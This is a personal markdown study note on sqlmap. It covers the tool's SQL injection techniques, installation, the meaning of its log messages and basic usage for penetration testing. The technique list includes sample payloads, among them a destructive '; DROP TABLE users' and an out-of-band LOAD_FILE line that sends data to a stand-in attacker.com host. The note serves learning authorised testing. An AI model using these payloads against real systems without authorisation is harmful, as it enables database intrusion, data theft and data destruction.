```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

## Summary
[SQLMap](https://github.com/sqlmapproject/sqlmap) is a tool for automating the process of detecting and exploiting SQLi vulnerabilities. It supports a plethora of databases types and the following techniques:
- `B` : Boolean-based blind - `AND 1=1`
- `E` : Error-based - `AND GTID_SUBSET(@@version,0)`
- `U` : Union query-based - `UNION ALL SELECT 1,@@version,3`
- `S` : Stacked queries - `; DROP TABLE users`
- `T` : Time-based blind - `AND 1=IF(2>1,SLEEP(5),0)`
- `Q` : Inline queries - `(SELECT @@version)`
- ` ` : Out-of-band injection - `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))

## Installation
```
sudo apt install sqlmap

git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

## Documentation
**Cheatsheet:** 
**Website:** https://github.com/sqlmapproject/sqlmap

## Important log messages
- `Target URL content is stable` : means that the responses are fairly consistent meaning its easier to spot the effects of SQLi attempts
- `GET parameter 'id' appears to be dynamic` : `dynamic` means that changes made to its value, change the output in the response (opposite is `static`)
- `heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')` : means that the get parameter needs to be tested further and it has attempted to guess the DBMS provider based on output.
- `heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks` : SQLMap also quickly runs XSS tests. Its nice to have when running against large websites, *two birds with one stone*.
- `reflective value(s) found and filtering out` : a warning to say that some parts of the payload can be seen in the output so they need to be filtered out before comparing the original page content (*SQLMap does this filtering automatically*).
- `GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")` : This means that SQLMap believes this parameter is a boolean-based blind injection. The `with --string="luther"` is important as it shows that its using this consistent value as its source of TRUE and FALSE responses; this is good as we don't need to use advanced internal mechanisms which could be more susceptible to false-positives.
- `time-based comparison requires a larger statistical model, please wait...(done)` : uses a statistical model for the recognition of regular and (deliberately) delayed target responses. To use this model, SQLMap must collect a large number of responses.
- `automatically extending ranges for UNION query injection technique tests as there is at least on other (potential) technique found` : it takes a large number of requests needed to be able to recognise usable UNION payloads, compared to other techniques. It is capped by default but this cap it extended if there is a good chance of vulnerability.
- `Get parameter 'id' is vulnerable. Do you want to keep testing the others (if any)?` : if we are doing a pentest then we want to test everything, not just find a single vulnerability.

## Usage
```bash
sqlmap -h # Basic options (most common)
sqlmap -hh # Advanced options
```
> A useful trick is to take a HTTP request in 
### GET Parameters
```bash
sqlmap -u "https://example.com/index.php?id=1" --batch
```
> `--batch` skips all user-input, automatically choosing based on the default options

